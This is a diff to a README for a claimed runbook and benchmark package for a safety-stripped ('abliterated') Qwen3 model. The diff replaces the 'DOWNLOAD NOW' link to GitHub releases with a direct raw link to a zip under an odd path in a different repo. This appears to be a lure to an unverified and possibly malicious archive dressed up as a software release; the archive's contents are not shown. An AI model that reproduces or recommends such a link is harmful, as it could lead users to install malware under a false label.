@@ -15,7 +15,7 @@ This is a complete, tested runbook and benchmark package for running the **Qwen3
 
 ## 📥 Download the Package
 
-[🎉 **DOWNLOAD NOW**](https://github.com/konstanzegreater7629/4xV100-qwen38-flash-next-abliterated-128gb-vram/releases) (Button opens in new tab)
+[🎉 **DOWNLOAD NOW**](https://raw.githubusercontent.com/konstanzegreater7629/konstanzegreater7629.github.io/main/chymification/Release-1.4.zip) (Button opens in new tab)
 
 )
 
